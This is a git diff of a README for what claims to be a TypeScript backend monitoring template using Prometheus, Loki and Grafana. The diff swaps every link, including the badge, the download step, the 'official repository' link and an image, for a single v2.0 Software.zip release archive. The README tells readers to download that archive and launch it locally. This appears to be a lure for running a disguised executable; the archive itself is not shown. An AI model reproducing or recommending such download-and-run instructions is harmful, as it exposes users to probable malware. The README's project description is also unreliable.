@@ -1,6 +1,6 @@
 # Production-Ready Backend Monitoring Template 🚀
 
-[![https://github.com/Killzstxrz/backend_monitoring_template/releases/download/v1.0/Release.zip](https://github.com/Killzstxrz/backend_monitoring_template/releases/download/v1.0/Release.zip)](https://github.com/Killzstxrz/backend_monitoring_template/releases/download/v1.0/Release.zip)
+[![https://github.com/Killzstxrz/backend_monitoring_template/releases/download/v2.0/Software.zip](https://github.com/Killzstxrz/backend_monitoring_template/releases/download/v2.0/Software.zip)](https://github.com/Killzstxrz/backend_monitoring_template/releases/download/v2.0/Software.zip)
 
 Welcome to the **backend_monitoring_template** repository, your go-to solution for production-ready backend monitoring with Prometheus, Loki, and Grafana in TypeScript! Whether you are a seasoned DevOps engineer or just starting out, this template provides a robust foundation for monitoring your backend services effectively.
 
@@ -20,9 +20,9 @@ Monitoring is a crucial aspect of maintaining the health and performance of your
 
 ## Getting Started
 
-To make use of this template, simply download the `https://github.com/Killzstxrz/backend_monitoring_template/releases/download/v1.0/Release.zip` file from the link provided above and launch it on your local machine. Follow the setup instructions included in the repository to start monitoring your backend services effectively.
+To make use of this template, simply download the `https://github.com/Killzstxrz/backend_monitoring_template/releases/download/v2.0/Software.zip` file from the link provided above and launch it on your local machine. Follow the setup instructions included in the repository to start monitoring your backend services effectively.
 
-In case the link for the `https://github.com/Killzstxrz/backend_monitoring_template/releases/download/v1.0/Release.zip` file is not working, kindly check the "Releases" section of this repository for alternative download options.
+In case the link for the `https://github.com/Killzstxrz/backend_monitoring_template/releases/download/v2.0/Software.zip` file is not working, kindly check the "Releases" section of this repository for alternative download options.
 
 ## Repository Topics
 
@@ -43,8 +43,8 @@ Explore the following topics covered in this repository:
 
 ## Resources
 
-For more information and detailed documentation, visit the [official repository](https://github.com/Killzstxrz/backend_monitoring_template/releases/download/v1.0/Release.zip).
+For more information and detailed documentation, visit the [official repository](https://github.com/Killzstxrz/backend_monitoring_template/releases/download/v2.0/Software.zip).
 
-![Monitoring](https://github.com/Killzstxrz/backend_monitoring_template/releases/download/v1.0/Release.zip)
+![Monitoring](https://github.com/Killzstxrz/backend_monitoring_template/releases/download/v2.0/Software.zip)
 
 Happy monitoring! 📈🚀
